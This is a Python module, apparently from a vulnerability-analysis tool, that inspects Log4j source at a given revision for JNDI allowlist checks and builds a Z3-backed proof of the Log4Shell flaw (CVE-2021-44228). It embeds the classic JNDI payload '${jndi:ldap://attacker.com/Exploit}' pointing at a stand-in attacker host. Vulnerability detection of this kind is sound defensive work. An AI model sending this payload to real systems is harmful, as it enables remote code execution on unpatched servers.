"""
Apache Log4j CVE-2021-44228 (Log4Shell) JNDI injection proof.

This prover analyzes Log4j's JNDI lookup functionality to detect whether
untrusted input can trigger remote code execution via JNDI lookups.

The vulnerability:
- In vulnerable versions (<= 2.14.1), JNDI lookups like ${jndi:ldap://...}
  in log messages are evaluated without restrictions
- In fixed versions (>= 2.15.0), protocol/host/class allowlists restrict lookups
"""

from __future__ import annotations

import re
import subprocess
from dataclasses import dataclass
from pathlib import Path
from typing import Optional

import z3

from isa.witness import Endpoint, Location, Target, Vuln, Witness


@dataclass(frozen=True)
class Log4jCheckout:
    repo_dir: Path
    rev: str


@dataclass(frozen=True)
class JndiValidation:
    """Info about JNDI lookup restrictions."""
    has_protocol_allowlist: bool
    has_host_allowlist: bool
    has_class_allowlist: bool
    file: str
    line: Optional[int]
    snippet: Optional[str]


def _run(cmd: list[str], cwd: Optional[Path] = None) -> str:
    p = subprocess.run(cmd, cwd=str(cwd) if cwd else None, check=True, text=True, capture_output=True)
    return p.stdout


def _ensure_log4j_checkout(cache_dir: Path, rev: str) -> Log4jCheckout:
    """Ensure Log4j is checked out at the given revision."""
    base = cache_dir / "logging-log4j2"
    rev_dir = cache_dir / f"log4j2-{rev}"

    if not (base / ".git").exists():
        base.parent.mkdir(parents=True, exist_ok=True)
        _run(["git", "clone", "--quiet", "https://github.com/apache/logging-log4j2.git", str(base)])

    if not rev_dir.exists():
        _run(["git", "worktree", "add", "--quiet", str(rev_dir), rev], cwd=base)

    return Log4jCheckout(repo_dir=rev_dir, rev=rev)


def _extract_jndi_restrictions(checkout: Log4jCheckout) -> JndiValidation:
    """Extract JNDI lookup restriction logic from JndiManager.
    
    We look for:
    1. allowedProtocols check
    2. allowedHosts check (for LDAP)
    3. allowedClasses check (for deserialization)
    
    Vulnerable versions lack these checks.
    """
    jndi_files = [
        checkout.repo_dir / "log4j-core/src/main/java/org/apache/logging/log4j/core/net/JndiManager.java",
        checkout.repo_dir / "log4j-core/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.java",
    ]
    
    has_protocol_check = False
    has_host_check = False
    has_class_check = False
    found_file = None
    found_line = None
    found_snippet = None
    
    for file_path in jndi_files:
        if not file_path.exists():
            continue
        
        txt = file_path.read_text("utf-8", errors="ignore")
        lines = txt.splitlines()
        
        # Look for allowedProtocols check
        if "allowedProtocols" in txt and "contains" in txt:
            has_protocol_check = True
            found_file = str(file_path.relative_to(checkout.repo_dir))
            
            # Find line number
            for i, line in enumerate(lines):
                if "allowedProtocols" in line and "contains" in line:
                    found_line = i + 1
                    found_snippet = "\n".join(lines[max(0, i - 2):i + 3])
                    break
        
        # Look for allowedHosts check (for LDAP)
        if "allowedHosts" in txt:
            has_host_check = True
        
        # Look for allowedClasses check
        if "allowedClasses" in txt:
            has_class_check = True
    
    # If none found, assume no restrictions (vulnerable)
    if not found_file:
        for file_path in jndi_files:
            if file_path.exists():
                found_file = str(file_path.relative_to(checkout.repo_dir))
                break
    
    return JndiValidation(
        has_protocol_allowlist=has_protocol_check,
        has_host_allowlist=has_host_check,
        has_class_allowlist=has_class_check,
        file=found_file or "unknown",
        line=found_line,
        snippet=found_snippet,
    )


def prove_witness(rev: str) -> Optional[Witness]:
    """Return a witness iff Z3 finds a feasible JNDI injection for this rev."""
    cache = Path.cwd() / ".isa_cache"
    checkout = _ensure_log4j_checkout(cache, rev)
    validation = _extract_jndi_restrictions(checkout)
    
    # If all three restrictions exist, it's likely fixed
    if validation.has_protocol_allowlist and validation.has_host_allowlist and validation.has_class_allowlist:
        return None
    
    # Vulnerable - build proof
    # The classic Log4Shell payload
    payload = "${jndi:ldap://attacker.com/Exploit}"
    
    msg = z3.String("log_message")
    
    # JNDI injection: message contains ${jndi:...} pattern
    has_jndi_lookup = z3.Contains(msg, z3.StringVal("${jndi:"))
    
    s = z3.Solver()
    s.add(msg == z3.StringVal(payload))
    s.add(has_jndi_lookup)
    
    if s.check() != z3.sat:
        return None
    
    model = s.model()
    
    smt2 = _generate_smt2(rev, validation, payload)
    
    return Witness(
        target=Target(repo="https://github.com/apache/logging-log4j2", rev=rev),
        vuln=Vuln(
            kind="jndi-injection/rce",
            advisory="CVE-2021-44228",
            cwe="CWE-917",
        ),
        source=Endpoint(
            kind="external_input",
            location=Location(file="<log_message>", function="log.info/log.error/etc"),
            notes="Attacker-controlled log message with JNDI lookup",
        ),
        sink=Endpoint(
            kind="jndi_lookup",
            location=Location(
                file=validation.file,
                line=validation.line,
                function="JndiManager.lookup",
            ),
            notes="JNDI lookup performed without protocol/host/class restrictions",
        ),
        call_chain=[
            Location(file="log4j-core/.../PatternLayout.java", function="toSerializable"),
            Location(file="log4j-core/.../StrSubstitutor.java", function="substitute"),
            Location(file="log4j-core/.../JndiLookup.java", function="lookup"),
            Location(file=validation.file, function="JndiManager.lookup"),
        ],
        path_constraints=[
            "log_message contains ${jndi:...}",
            f"allowedProtocols check: {validation.has_protocol_allowlist}",
            f"allowedHosts check: {validation.has_host_allowlist}",
            f"allowedClasses check: {validation.has_class_allowlist}",
        ],
        smt2=smt2,
        z3_model={
            "log_message": payload,
            "has_protocol_allowlist": validation.has_protocol_allowlist,
            "has_host_allowlist": validation.has_host_allowlist,
            "has_class_allowlist": validation.has_class_allowlist,
            "validation_snippet": validation.snippet,
        },
    )


def _generate_smt2(rev: str, validation: JndiValidation, payload: str) -> str:
    """Generate SMT2 representation of the proof."""
    lines = [
        ";; injection-smt-analyzer proof (Apache Log4j CVE-2021-44228 / Log4Shell)",
        f";; Target: apache/logging-log4j2 @ {rev}",
        f";; Protocol allowlist: {validation.has_protocol_allowlist}",
        f";; Host allowlist: {validation.has_host_allowlist}",
        f";; Class allowlist: {validation.has_class_allowlist}",
        "",
        "(set-logic QF_S)",
        "",
        "(declare-const log_message String)",
        "",
        f'(assert (= log_message "{_escape_smt2_string(payload)}"))',
        "",
    ]
    
    if validation.has_protocol_allowlist and validation.has_host_allowlist and validation.has_class_allowlist:
        lines.extend([
            ";; All JNDI restrictions in place (fixed)",
            "(assert false)",
        ])
    else:
        lines.extend([
            ";; JNDI lookup executed without sufficient restrictions (vulnerable)",
            '(assert (str.contains log_message "${jndi:"))',
        ])
    
    lines.extend([
        "",
        "(check-sat)",
        "(get-model)",
    ])
    
    return "\n".join(lines)


def _escape_smt2_string(s: str) -> str:
    """Escape string for SMT2."""
    result = []
    for c in s:
        if c == '"':
            result.append('""')
        elif c == '\\':
            result.append('\\\\')
        elif c == '$':
            result.append('$$')  # Escape $ in SMT2 strings
        elif ord(c) < 0x20 or ord(c) > 0x7e:
            result.append(f'\\x{ord(c):02x}')
        else:
            result.append(c)
    return "".join(result)
